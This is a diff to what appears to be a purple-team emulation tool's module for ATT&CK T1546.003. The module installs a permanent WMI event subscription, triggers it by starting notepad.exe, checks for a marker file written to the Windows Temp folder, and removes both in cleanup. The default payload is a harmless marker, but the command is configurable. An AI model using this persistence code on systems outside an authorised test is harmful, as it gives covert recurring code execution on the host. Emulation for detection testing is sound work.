@@ -20,7 +20,10 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
         event_query = parameters.get("event_query") or (
             "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"
         )
-        command = parameters.get("command") or "cmd.exe /c echo PurpleStrike"
+        command = parameters.get("command") or (
+            "cmd.exe /d /c echo PurpleStrike-T1546.003>"
+            "C:\\Windows\\Temp\\purplestrike_wmi_subscription.txt"
+        )
         token = uuid4().hex[:10]
         filter_name = f"PurpleStrikeFilter_{token}"
         consumer_name = f"PurpleStrikeConsumer_{token}"
@@ -37,12 +40,29 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
             "Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding "
             "-Arguments @{Filter=$f; Consumer=$c}"
         )
+        if result.success:
+            triggered = await conn.run_ps(
+                "$ErrorActionPreference = 'Stop'; "
+                "$marker = 'C:\\Windows\\Temp\\purplestrike_wmi_subscription.txt'; "
+                "[IO.File]::Delete($marker); "
+                "$process = Start-Process -FilePath 'notepad.exe' -PassThru; "
+                "try { for ($i=0; $i -lt 20 -and !(Test-Path -LiteralPath $marker); $i++) "
+                "{ Start-Sleep -Milliseconds 250 }; "
+                "Get-Content -LiteralPath $marker -ErrorAction Stop } finally { "
+                "Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue }"
+            )
+            result.stdout += triggered.stdout
+            result.stderr += triggered.stderr
+            result.exit_code = triggered.exit_code
+            result.success = triggered.success
         return TechniqueResult(
             technique_id="T1546.003",
             success=result.success,
             output=result.stdout[:4096],
             error=result.stderr[:1024] if not result.success else None,
             execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
+            artifacts=["C:\\Windows\\Temp\\purplestrike_wmi_subscription.txt"],
+            evidence=["The permanent WMI subscription executed after a process-start event."],
         )
     except Exception as e:
         logger.error(f"T1546.003 execution failed: {e}")
@@ -78,7 +98,10 @@ async def cleanup(target: str) -> None:
             "Get-WmiObject -Namespace root\\subscription "
             "-Class __EventFilter -Filter "
             f"\"Name='{filter_name}'\" "
-            "| Remove-WmiObject"
+            "| Remove-WmiObject; "
+            "Remove-Item -LiteralPath "
+            "'C:\\Windows\\Temp\\purplestrike_wmi_subscription.txt' "
+            "-Force -ErrorAction SilentlyContinue"
         )
         if not result.success:
             raise RuntimeError(command_error(result))
